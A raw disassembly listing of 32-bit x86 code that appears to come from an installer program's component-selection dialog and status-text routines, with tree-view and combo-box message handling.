  405074:	ff 35 4c ca 42 00    	push   0x42ca4c
  40507a:	6a 02                	push   $0x2
  40507c:	68 09 11 00 00       	push   $0x1109
  405081:	ff 75 fc             	push   -0x4(%ebp)
  405084:	ff d6                	call   *%esi
  405086:	57                   	push   %edi
  405087:	57                   	push   %edi
  405088:	68 1c 11 00 00       	push   $0x111c
  40508d:	ff 75 fc             	push   -0x4(%ebp)
  405090:	ff d6                	call   *%esi
  405092:	83 f8 10             	cmp    $0x10,%eax
  405095:	7d 0d                	jge    0x4050a4
  405097:	57                   	push   %edi
  405098:	6a 10                	push   $0x10
  40509a:	68 1b 11 00 00       	push   $0x111b
  40509f:	ff 75 fc             	push   -0x4(%ebp)
  4050a2:	ff d6                	call   *%esi
  4050a4:	53                   	push   %ebx
  4050a5:	ff 15 54 80 40 00    	call   *0x408054
  4050ab:	33 db                	xor    %ebx,%ebx
  4050ad:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4050b0:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  4050b3:	3b c7                	cmp    %edi,%eax
  4050b5:	74 27                	je     0x4050de
  4050b7:	83 fb 20             	cmp    $0x20,%ebx
  4050ba:	74 03                	je     0x4050bf
  4050bc:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4050bf:	50                   	push   %eax
  4050c0:	57                   	push   %edi
  4050c1:	e8 36 15 00 00       	call   0x4065fc
  4050c6:	50                   	push   %eax
  4050c7:	57                   	push   %edi
  4050c8:	68 43 01 00 00       	push   $0x143
  4050cd:	ff 75 f8             	push   -0x8(%ebp)
  4050d0:	ff d6                	call   *%esi
  4050d2:	53                   	push   %ebx
  4050d3:	50                   	push   %eax
  4050d4:	68 51 01 00 00       	push   $0x151
  4050d9:	ff 75 f8             	push   -0x8(%ebp)
  4050dc:	ff d6                	call   *%esi
  4050de:	43                   	inc    %ebx
  4050df:	83 fb 21             	cmp    $0x21,%ebx
  4050e2:	7c c9                	jl     0x4050ad
  4050e4:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4050e7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050ea:	ff 74 83 30          	push   0x30(%ebx,%eax,4)
  4050ee:	6a 15                	push   $0x15
  4050f0:	ff 75 08             	push   0x8(%ebp)
  4050f3:	e8 46 f4 ff ff       	call   0x40453e
  4050f8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050fb:	ff 74 83 34          	push   0x34(%ebx,%eax,4)
  4050ff:	6a 16                	push   $0x16
  405101:	ff 75 08             	push   0x8(%ebp)
  405104:	e8 35 f4 ff ff       	call   0x40453e
  405109:	33 db                	xor    %ebx,%ebx
  40510b:	39 3d 2c 47 43 00    	cmp    %edi,0x43472c
  405111:	89 7d f4             	mov    %edi,-0xc(%ebp)
  405114:	0f 8e ca 00 00 00    	jle    0x4051e4
  40511a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40511d:	8d 50 08             	lea    0x8(%eax),%edx
  405120:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  405123:	8d 42 10             	lea    0x10(%edx),%eax
  405126:	66 39 38             	cmp    %di,(%eax)
  405129:	0f 84 97 00 00 00    	je     0x4051c6
  40512f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405132:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  405135:	8b 02                	mov    (%edx),%eax
  405137:	6a 20                	push   $0x20
  405139:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  40513c:	59                   	pop    %ecx
  40513d:	8b d0                	mov    %eax,%edx
  40513f:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  405146:	23 d1                	and    %ecx,%edx
  405148:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  40514f:	a8 02                	test   $0x2,%al
  405151:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  405154:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  405157:	89 55 bc             	mov    %edx,-0x44(%ebp)
  40515a:	74 3a                	je     0x405196
  40515c:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40515f:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  405166:	50                   	push   %eax
  405167:	57                   	push   %edi
  405168:	68 32 11 00 00       	push   $0x1132
  40516d:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  405174:	ff 75 fc             	push   -0x4(%ebp)
  405177:	ff d6                	call   *%esi
  405179:	8b 0d 60 ca 42 00    	mov    0x42ca60,%ecx
  40517f:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  405186:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  405189:	a1 60 ca 42 00       	mov    0x42ca60,%eax
  40518e:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  405191:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405194:	eb 30                	jmp    0x4051c6
  405196:	a8 04                	test   $0x4,%al
  405198:	74 14                	je     0x4051ae
  40519a:	ff 75 f4             	push   -0xc(%ebp)
  40519d:	6a 03                	push   $0x3
  40519f:	68 0a 11 00 00       	push   $0x110a
  4051a4:	ff 75 fc             	push   -0x4(%ebp)
  4051a7:	ff d6                	call   *%esi
  4051a9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4051ac:	eb 18                	jmp    0x4051c6
  4051ae:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4051b1:	50                   	push   %eax
  4051b2:	57                   	push   %edi
  4051b3:	68 32 11 00 00       	push   $0x1132
  4051b8:	ff 75 fc             	push   -0x4(%ebp)
  4051bb:	ff d6                	call   *%esi
  4051bd:	8b 0d 60 ca 42 00    	mov    0x42ca60,%ecx
  4051c3:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  4051c6:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4051c9:	43                   	inc    %ebx
  4051ca:	81 c2 18 08 00 00    	add    $0x818,%edx
  4051d0:	3b 1d 2c 47 43 00    	cmp    0x43472c,%ebx
  4051d6:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4051d9:	0f 8c 44 ff ff ff    	jl     0x405123
  4051df:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  4051e2:	75 19                	jne    0x4051fd
  4051e4:	6a f0                	push   $0xfffffff0
  4051e6:	ff 75 fc             	push   -0x4(%ebp)
  4051e9:	ff 15 d4 81 40 00    	call   *0x4081d4
  4051ef:	24 fb                	and    $0xfb,%al
  4051f1:	50                   	push   %eax
  4051f2:	6a f0                	push   $0xfffffff0
  4051f4:	ff 75 fc             	push   -0x4(%ebp)
  4051f7:	ff 15 40 82 40 00    	call   *0x408240
  4051fd:	39 7d f0             	cmp    %edi,-0x10(%ebp)
  405200:	75 18                	jne    0x40521a
  405202:	6a 05                	push   $0x5
  405204:	ff 75 f8             	push   -0x8(%ebp)
  405207:	ff 15 28 82 40 00    	call   *0x408228
  40520d:	ff 75 f8             	push   -0x8(%ebp)
  405210:	e8 5e f3 ff ff       	call   0x404573
  405215:	e9 89 03 00 00       	jmp    0x4055a3
  40521a:	ff 75 fc             	push   -0x4(%ebp)
  40521d:	e8 51 f3 ff ff       	call   0x404573
  405222:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405229:	75 12                	jne    0x40523d
  40522b:	33 c9                	xor    %ecx,%ecx
  40522d:	89 7d 10             	mov    %edi,0x10(%ebp)
  405230:	41                   	inc    %ecx
  405231:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  405238:	89 4d 14             	mov    %ecx,0x14(%ebp)
  40523b:	eb 03                	jmp    0x405240
  40523d:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405240:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  405244:	b8 13 04 00 00       	mov    $0x413,%eax
  405249:	74 09                	je     0x405254
  40524b:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40524e:	0f 85 e4 00 00 00    	jne    0x405338
  405254:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405257:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40525a:	74 0d                	je     0x405269
  40525c:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  405263:	0f 85 cf 00 00 00    	jne    0x405338
  405269:	f6 05 19 47 43 00 02 	testb  $0x2,0x434719
  405270:	75 73                	jne    0x4052e5
  405272:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405275:	74 09                	je     0x405280
  405277:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40527a:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  40527e:	75 65                	jne    0x4052e5
  405280:	33 c9                	xor    %ecx,%ecx
  405282:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405285:	0f 95 c1             	setne  %cl
  405288:	51                   	push   %ecx
  405289:	ff 75 fc             	push   -0x4(%ebp)
  40528c:	e8 68 fc ff ff       	call   0x404ef9
  405291:	8b d8                	mov    %eax,%ebx
  405293:	3b df                	cmp    %edi,%ebx
  405295:	7c 4e                	jl     0x4052e5
  405297:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  40529d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4052a0:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  4052a4:	8b 01                	mov    (%ecx),%eax
  4052a6:	a8 10                	test   $0x10,%al
  4052a8:	75 3b                	jne    0x4052e5
  4052aa:	a8 40                	test   $0x40,%al
  4052ac:	74 11                	je     0x4052bf
  4052ae:	35 80 00 00 00       	xor    $0x80,%eax
  4052b3:	84 c0                	test   %al,%al
  4052b5:	79 04                	jns    0x4052bb
  4052b7:	0c 01                	or     $0x1,%al
  4052b9:	eb 07                	jmp    0x4052c2
  4052bb:	24 fe                	and    $0xfe,%al
  4052bd:	eb 03                	jmp    0x4052c2
  4052bf:	83 f0 01             	xor    $0x1,%eax
  4052c2:	53                   	push   %ebx
  4052c3:	89 01                	mov    %eax,(%ecx)
  4052c5:	e8 b3 be ff ff       	call   0x40117d
  4052ca:	a1 18 47 43 00       	mov    0x434718,%eax
  4052cf:	43                   	inc    %ebx
  4052d0:	f7 d0                	not    %eax
  4052d2:	c1 e8 08             	shr    $0x8,%eax
  4052d5:	83 e0 01             	and    $0x1,%eax
  4052d8:	89 5d 10             	mov    %ebx,0x10(%ebp)
  4052db:	89 45 14             	mov    %eax,0x14(%ebp)
  4052de:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4052e5:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  4052e8:	74 4e                	je     0x405338
  4052ea:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052ed:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  4052f4:	75 0e                	jne    0x405304
  4052f6:	ff 70 5c             	push   0x5c(%eax)
  4052f9:	57                   	push   %edi
  4052fa:	68 19 04 00 00       	push   $0x419
  4052ff:	ff 75 fc             	push   -0x4(%ebp)
  405302:	ff d6                	call   *%esi
  405304:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405307:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  40530e:	75 28                	jne    0x405338
  405310:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  405314:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405317:	8b 40 5c             	mov    0x5c(%eax),%eax
  40531a:	75 0f                	jne    0x40532b
  40531c:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  405322:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  405326:	83 08 20             	orl    $0x20,(%eax)
  405329:	eb 0d                	jmp    0x405338
  40532b:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  405331:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  405335:	83 20 df             	andl   $0xffffffdf,(%eax)
  405338:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40533f:	75 6f                	jne    0x4053b0
  405341:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  405347:	0f 85 56 02 00 00    	jne    0x4055a3
  40534d:	8b 45 10             	mov    0x10(%ebp),%eax
  405350:	c1 e8 10             	shr    $0x10,%eax
  405353:	66 3d 01 00          	cmp    $0x1,%ax
  405357:	0f 85 46 02 00 00    	jne    0x4055a3
  40535d:	57                   	push   %edi
  40535e:	57                   	push   %edi
  40535f:	68 47 01 00 00       	push   $0x147
  405364:	ff 75 f8             	push   -0x8(%ebp)
  405367:	ff d6                	call   *%esi
  405369:	83 f8 ff             	cmp    $0xffffffff,%eax
  40536c:	0f 84 31 02 00 00    	je     0x4055a3
  405372:	57                   	push   %edi
  405373:	50                   	push   %eax
  405374:	68 50 01 00 00       	push   $0x150
  405379:	ff 75 f8             	push   -0x8(%ebp)
  40537c:	ff d6                	call   *%esi
  40537e:	8b d8                	mov    %eax,%ebx
  405380:	83 fb ff             	cmp    $0xffffffff,%ebx
  405383:	74 08                	je     0x40538d
  405385:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405388:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  40538b:	75 03                	jne    0x405390
  40538d:	6a 20                	push   $0x20
  40538f:	5b                   	pop    %ebx
  405390:	53                   	push   %ebx
  405391:	e8 03 bf ff ff       	call   0x401299
  405396:	53                   	push   %ebx
  405397:	57                   	push   %edi
  405398:	68 20 04 00 00       	push   $0x420
  40539d:	ff 75 08             	push   0x8(%ebp)
  4053a0:	ff d6                	call   *%esi
  4053a2:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  4053a6:	89 7d 14             	mov    %edi,0x14(%ebp)
  4053a9:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4053b0:	b8 00 02 00 00       	mov    $0x200,%eax
  4053b5:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4053b8:	75 08                	jne    0x4053c2
  4053ba:	57                   	push   %edi
  4053bb:	57                   	push   %edi
  4053bc:	50                   	push   %eax
  4053bd:	ff 75 fc             	push   -0x4(%ebp)
  4053c0:	ff d6                	call   *%esi
  4053c2:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4053c9:	75 32                	jne    0x4053fd
  4053cb:	a1 4c ca 42 00       	mov    0x42ca4c,%eax
  4053d0:	3b c7                	cmp    %edi,%eax
  4053d2:	74 07                	je     0x4053db
  4053d4:	50                   	push   %eax
  4053d5:	ff 15 34 80 40 00    	call   *0x408034
  4053db:	a1 60 ca 42 00       	mov    0x42ca60,%eax
  4053e0:	3b c7                	cmp    %edi,%eax
  4053e2:	74 07                	je     0x4053eb
  4053e4:	50                   	push   %eax
  4053e5:	ff 15 0c 81 40 00    	call   *0x40810c
  4053eb:	89 3d 4c ca 42 00    	mov    %edi,0x42ca4c
  4053f1:	89 3d 60 ca 42 00    	mov    %edi,0x42ca60
  4053f7:	89 3d 60 47 43 00    	mov    %edi,0x434760
  4053fd:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  405404:	0f 85 5b 01 00 00    	jne    0x405565
  40540a:	57                   	push   %edi
  40540b:	57                   	push   %edi
  40540c:	e8 de bd ff ff       	call   0x4011ef
  405411:	8b 45 10             	mov    0x10(%ebp),%eax
  405414:	3b c7                	cmp    %edi,%eax
  405416:	74 0e                	je     0x405426
  405418:	83 f8 ff             	cmp    $0xffffffff,%eax
  40541b:	74 01                	je     0x40541e
  40541d:	48                   	dec    %eax
  40541e:	50                   	push   %eax
  40541f:	6a 08                	push   $0x8
  405421:	e8 53 fb ff ff       	call   0x404f79
  405426:	39 7d 14             	cmp    %edi,0x14(%ebp)
  405429:	74 3f                	je     0x40546a
  40542b:	ff 35 60 ca 42 00    	push   0x42ca60
  405431:	e8 ac be ff ff       	call   0x4012e2
  405436:	8b d8                	mov    %eax,%ebx
  405438:	53                   	push   %ebx
  405439:	e8 5b be ff ff       	call   0x401299
  40543e:	33 c0                	xor    %eax,%eax
  405440:	33 c9                	xor    %ecx,%ecx
  405442:	3b df                	cmp    %edi,%ebx
  405444:	7e 0e                	jle    0x405454
  405446:	8b 55 e8             	mov    -0x18(%ebp),%edx
  405449:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  40544c:	74 01                	je     0x40544f
  40544e:	41                   	inc    %ecx
  40544f:	40                   	inc    %eax
  405450:	3b c3                	cmp    %ebx,%eax
  405452:	7c f2                	jl     0x405446
  405454:	57                   	push   %edi
  405455:	51                   	push   %ecx
  405456:	68 4e 01 00 00       	push   $0x14e
  40545b:	ff 75 f8             	push   -0x8(%ebp)
  40545e:	ff d6                	call   *%esi
  405460:	89 5d 14             	mov    %ebx,0x14(%ebp)
  405463:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  40546a:	57                   	push   %edi
  40546b:	57                   	push   %edi
  40546c:	e8 7e bd ff ff       	call   0x4011ef
  405471:	a1 60 ca 42 00       	mov    0x42ca60,%eax
  405476:	39 3d 2c 47 43 00    	cmp    %edi,0x43472c
  40547c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40547f:	a1 28 47 43 00       	mov    0x434728,%eax
  405484:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  40548b:	89 7d ec             	mov    %edi,-0x14(%ebp)
  40548e:	0f 8e 9c 00 00 00    	jle    0x405530
  405494:	8d 58 08             	lea    0x8(%eax),%ebx
  405497:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40549a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40549d:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  4054a0:	3b c7                	cmp    %edi,%eax
  4054a2:	74 74                	je     0x405518
  4054a4:	8b 0b                	mov    (%ebx),%ecx
  4054a6:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4054a9:	f6 c5 01             	test   $0x1,%ch
  4054ac:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  4054b3:	74 11                	je     0x4054c6
  4054b5:	8d 43 10             	lea    0x10(%ebx),%eax
  4054b8:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  4054bf:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4054c2:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  4054c6:	f6 c1 40             	test   $0x40,%cl
  4054c9:	74 05                	je     0x4054d0
  4054cb:	6a 03                	push   $0x3
  4054cd:	58                   	pop    %eax
  4054ce:	eb 0e                	jmp    0x4054de
  4054d0:	8b c1                	mov    %ecx,%eax
  4054d2:	83 e0 01             	and    $0x1,%eax
  4054d5:	40                   	inc    %eax
  4054d6:	f6 c1 10             	test   $0x10,%cl
  4054d9:	74 03                	je     0x4054de
  4054db:	83 c0 03             	add    $0x3,%eax
  4054de:	8b d1                	mov    %ecx,%edx
  4054e0:	ff 75 bc             	push   -0x44(%ebp)
  4054e3:	c1 e0 0b             	shl    $0xb,%eax
  4054e6:	83 e2 08             	and    $0x8,%edx
  4054e9:	0b c2                	or     %edx,%eax
  4054eb:	8b d1                	mov    %ecx,%edx
  4054ed:	c1 f9 05             	sar    $0x5,%ecx
  4054f0:	03 c0                	add    %eax,%eax
  4054f2:	83 e2 20             	and    $0x20,%edx
  4054f5:	83 e1 01             	and    $0x1,%ecx
  4054f8:	0b c2                	or     %edx,%eax
  4054fa:	41                   	inc    %ecx
  4054fb:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4054fe:	51                   	push   %ecx
  4054ff:	68 02 11 00 00       	push   $0x1102
  405504:	ff 75 fc             	push   -0x4(%ebp)
  405507:	ff d6                	call   *%esi
  405509:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40550c:	50                   	push   %eax
  40550d:	57                   	push   %edi
  40550e:	68 3f 11 00 00       	push   $0x113f
  405513:	ff 75 fc             	push   -0x4(%ebp)
  405516:	ff d6                	call   *%esi
  405518:	ff 45 ec             	incl   -0x14(%ebp)
  40551b:	81 c3 18 08 00 00    	add    $0x818,%ebx
  405521:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405524:	3b 05 2c 47 43 00    	cmp    0x43472c,%eax
  40552a:	0f 8c 67 ff ff ff    	jl     0x405497
  405530:	66 81 3d be 47 43 00 	cmpw   $0x400,0x4347be
  405537:	00 04 
  405539:	75 0c                	jne    0x405547
  40553b:	6a 01                	push   $0x1
  40553d:	57                   	push   %edi
  40553e:	ff 75 fc             	push   -0x4(%ebp)
  405541:	ff 15 54 82 40 00    	call   *0x408254
  405547:	a1 dc 36 43 00       	mov    0x4336dc,%eax
  40554c:	39 78 10             	cmp    %edi,0x10(%eax)
  40554f:	74 14                	je     0x405565
  405551:	6a 05                	push   $0x5
  405553:	e8 74 f9 ff ff       	call   0x404ecc
  405558:	50                   	push   %eax
  405559:	6a fb                	push   $0xfffffffb
  40555b:	68 ff 03 00 00       	push   $0x3ff
  405560:	e8 4f f9 ff ff       	call   0x404eb4
  405565:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  40556c:	75 35                	jne    0x4055a3
  40556e:	f6 05 19 47 43 00 01 	testb  $0x1,0x434719
  405575:	74 2c                	je     0x4055a3
  405577:	33 c0                	xor    %eax,%eax
  405579:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  40557d:	8b 35 28 82 40 00    	mov    0x408228,%esi
  405583:	0f 94 c0             	sete   %al
  405586:	c1 e0 03             	shl    $0x3,%eax
  405589:	8b f8                	mov    %eax,%edi
  40558b:	57                   	push   %edi
  40558c:	ff 75 fc             	push   -0x4(%ebp)
  40558f:	ff d6                	call   *%esi
  405591:	57                   	push   %edi
  405592:	68 fe 03 00 00       	push   $0x3fe
  405597:	ff 75 08             	push   0x8(%ebp)
  40559a:	ff 15 3c 82 40 00    	call   *0x40823c
  4055a0:	50                   	push   %eax
  4055a1:	ff d6                	call   *%esi
  4055a3:	ff 75 14             	push   0x14(%ebp)
  4055a6:	ff 75 10             	push   0x10(%ebp)
  4055a9:	ff 75 0c             	push   0xc(%ebp)
  4055ac:	e8 f4 ef ff ff       	call   0x4045a5
  4055b1:	5f                   	pop    %edi
  4055b2:	5e                   	pop    %esi
  4055b3:	5b                   	pop    %ebx
  4055b4:	c9                   	leave
  4055b5:	c2 10 00             	ret    $0x10
  4055b8:	55                   	push   %ebp
  4055b9:	8b ec                	mov    %esp,%ebp
  4055bb:	53                   	push   %ebx
  4055bc:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4055bf:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  4055c5:	57                   	push   %edi
  4055c6:	75 14                	jne    0x4055dc
  4055c8:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  4055cc:	75 59                	jne    0x405627
  4055ce:	68 13 04 00 00       	push   $0x413
  4055d3:	e8 b2 ef ff ff       	call   0x40458a
  4055d8:	33 c0                	xor    %eax,%eax
  4055da:	eb 62                	jmp    0x40563e
  4055dc:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  4055e2:	75 20                	jne    0x405604
  4055e4:	ff 75 08             	push   0x8(%ebp)
  4055e7:	ff 15 b4 81 40 00    	call   *0x4081b4
  4055ed:	85 c0                	test   %eax,%eax
  4055ef:	74 36                	je     0x405627
  4055f1:	6a 01                	push   $0x1
  4055f3:	ff 75 08             	push   0x8(%ebp)
  4055f6:	e8 fe f8 ff ff       	call   0x404ef9
  4055fb:	8b f8                	mov    %eax,%edi
  4055fd:	bb 19 04 00 00       	mov    $0x419,%ebx
  405602:	eb 03                	jmp    0x405607
  405604:	8b 7d 14             	mov    0x14(%ebp),%edi
  405607:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  40560d:	75 1b                	jne    0x40562a
  40560f:	39 3d 54 ca 42 00    	cmp    %edi,0x42ca54
  405615:	74 13                	je     0x40562a
  405617:	57                   	push   %edi
  405618:	6a 06                	push   $0x6
  40561a:	89 3d 54 ca 42 00    	mov    %edi,0x42ca54
  405620:	e8 54 f9 ff ff       	call   0x404f79
  405625:	eb 03                	jmp    0x40562a
  405627:	8b 7d 14             	mov    0x14(%ebp),%edi
  40562a:	57                   	push   %edi
  40562b:	ff 75 10             	push   0x10(%ebp)
  40562e:	53                   	push   %ebx
  40562f:	ff 75 08             	push   0x8(%ebp)
  405632:	ff 35 5c ca 42 00    	push   0x42ca5c
  405638:	ff 15 b8 81 40 00    	call   *0x4081b8
  40563e:	5f                   	pop    %edi
  40563f:	5b                   	pop    %ebx
  405640:	5d                   	pop    %ebp
  405641:	c2 10 00             	ret    $0x10
  405644:	55                   	push   %ebp
  405645:	8b ec                	mov    %esp,%ebp
  405647:	83 ec 30             	sub    $0x30,%esp
  40564a:	a1 e4 36 43 00       	mov    0x4336e4,%eax
  40564f:	53                   	push   %ebx
  405650:	56                   	push   %esi
  405651:	57                   	push   %edi
  405652:	33 ff                	xor    %edi,%edi
  405654:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405657:	3b c7                	cmp    %edi,%eax
  405659:	0f 84 b1 00 00 00    	je     0x405710
  40565f:	8b 1d b4 47 43 00    	mov    0x4347b4,%ebx
  405665:	be 48 ba 42 00       	mov    $0x42ba48,%esi
  40566a:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40566d:	83 e3 01             	and    $0x1,%ebx
  405670:	75 09                	jne    0x40567b
  405672:	ff 75 08             	push   0x8(%ebp)
  405675:	56                   	push   %esi
  405676:	e8 81 0f 00 00       	call   0x4065fc
  40567b:	56                   	push   %esi
  40567c:	e8 54 0f 00 00       	call   0x4065d5
  405681:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  405684:	89 45 08             	mov    %eax,0x8(%ebp)
  405687:	74 1b                	je     0x4056a4
  405689:	ff 75 0c             	push   0xc(%ebp)
  40568c:	e8 44 0f 00 00       	call   0x4065d5
  405691:	03 45 08             	add    0x8(%ebp),%eax
  405694:	3d 00 10 00 00       	cmp    $0x1000,%eax
  405699:	73 75                	jae    0x405710
  40569b:	ff 75 0c             	push   0xc(%ebp)
  40569e:	56                   	push   %esi
  40569f:	e8 37 0f 00 00       	call   0x4065db
  4056a4:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  4056a8:	75 0d                	jne    0x4056b7
  4056aa:	56                   	push   %esi
  4056ab:	ff 35 c8 36 43 00    	push   0x4336c8
  4056b1:	ff 15 1c 82 40 00    	call   *0x40821c
  4056b7:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  4056bb:	75 44                	jne    0x405701
  4056bd:	57                   	push   %edi
  4056be:	57                   	push   %edi
  4056bf:	68 04 10 00 00       	push   $0x1004
  4056c4:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4056c7:	ff 75 fc             	push   -0x4(%ebp)
  4056ca:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4056d0:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  4056d7:	ff d6                	call   *%esi
  4056d9:	2b c3                	sub    %ebx,%eax
  4056db:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4056de:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4056e1:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4056e4:	50                   	push   %eax
  4056e5:	b8 4d 10 00 00       	mov    $0x104d,%eax
  4056ea:	2b c3                	sub    %ebx,%eax
  4056ec:	57                   	push   %edi
  4056ed:	50                   	push   %eax
  4056ee:	ff 75 fc             	push   -0x4(%ebp)
  4056f1:	ff d6                	call   *%esi
  4056f3:	57                   	push   %edi
  4056f4:	ff 75 d4             	push   -0x2c(%ebp)
  4056f7:	68 13 10 00 00       	push   $0x1013
  4056fc:	ff 75 fc             	push   -0x4(%ebp)
  4056ff:	ff d6                	call   *%esi
  405701:	3b df                	cmp    %edi,%ebx
  405703:	74 0b                	je     0x405710
  405705:	8b 45 08             	mov    0x8(%ebp),%eax
  405708:	66 89 3c 45 48 ba 42 	mov    %di,0x42ba48(,%eax,2)
  40570f:	00 
  405710:	5f                   	pop    %edi
  405711:	5e                   	pop    %esi
  405712:	5b                   	pop    %ebx
  405713:	c9                   	leave
  405714:	c2 08 00             	ret    $0x8
  405717:	56                   	push   %esi
  405718:	8b 35 28 47 43 00    	mov    0x434728,%esi
  40571e:	57                   	push   %edi
  40571f:	8b 3d 2c 47 43 00    	mov    0x43472c,%edi
  405725:	6a 00                	push   $0x0
  405727:	ff 15 98 82 40 00    	call   *0x408298
  40572d:	09 05 c0 47 43 00    	or     %eax,0x4347c0
  405733:	6a 00                	push   $0x0
  405735:	e8 50 ee ff ff       	call   0x40458a
  40573a:	85 ff                	test   %edi,%edi
  40573c:	74 2b                	je     0x405769
  40573e:	83 c6 0c             	add    $0xc,%esi
  405741:	4f                   	dec    %edi
  405742:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405746:	74 0f                	je     0x405757
  405748:	ff 74 24 0c          	push   0xc(%esp)
  40574c:	ff 36                	push   (%esi)
  40574e:	e8 36 bc ff ff       	call   0x401389
  405753:	85 c0                	test   %eax,%eax
  405755:	75 0c                	jne    0x405763
  405757:	81 c6 18 08 00 00    	add    $0x818,%esi
  40575d:	85 ff                	test   %edi,%edi
  40575f:	75 e0                	jne    0x405741
  405761:	eb 06                	jmp    0x405769
  405763:	ff 05 8c 47 43 00    	incl   0x43478c
  405769:	68 04 04 00 00       	push   $0x404
  40576e:	e8 17 ee ff ff       	call   0x40458a
  405773:	ff 15 94 82 40 00    	call   *0x408294
  405779:	a1 8c 47 43 00       	mov    0x43478c,%eax
  40577e:	5f                   	pop    %edi
  40577f:	5e                   	pop    %esi
  405780:	c2 04 00             	ret    $0x4
